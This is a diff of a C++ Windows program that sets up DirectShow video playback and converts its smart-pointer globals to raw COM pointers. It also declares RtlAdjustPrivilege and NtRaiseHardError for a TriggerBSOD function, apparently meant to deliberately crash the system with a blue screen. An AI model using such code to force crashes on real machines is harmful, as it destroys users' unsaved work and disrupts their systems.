@@ -1,16 +1,15 @@
 #include <dshow.h>
-#include <memory>
 #include <windows.h>
 
 // externs for BSoD functions
 extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG privilege, BOOLEAN enable, BOOLEAN client, PBOOLEAN wasEnabled);
 extern "C" NTSTATUS NTAPI NtRaiseHardError(NTSTATUS errorStatus, ULONG numberOfParameters, ULONG unicodeStringParameterMask, PULONG_PTR parameters, ULONG validResponseOptions, PULONG response);
 
-// smart pointers for DirectShow interfaces
-std::unique_ptr<IGraphBuilder> graph;
-std::unique_ptr<IMediaControl> control;
-std::unique_ptr<IMediaEvent> event;
-std::unique_ptr<IVideoWindow> window;
+// global pointers for DirectShow interfaces
+IGraphBuilder* graph = NULL;
+IMediaControl* control = NULL;
+IMediaEvent* event = NULL;
+IVideoWindow* window = NULL;
 
 void TriggerBSOD() {
     // initialize variables
@@ -65,11 +64,6 @@ void InitializeDirectShow(LPCWSTR path) {
     CoInitialize(NULL);
 
     // create DirectShow objects
-    graph.reset();
-    control.reset();
-    event.reset();
-    window.reset();
-
     CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void**)&graph);
 
     graph->QueryInterface(IID_IMediaControl, (void**)&control);
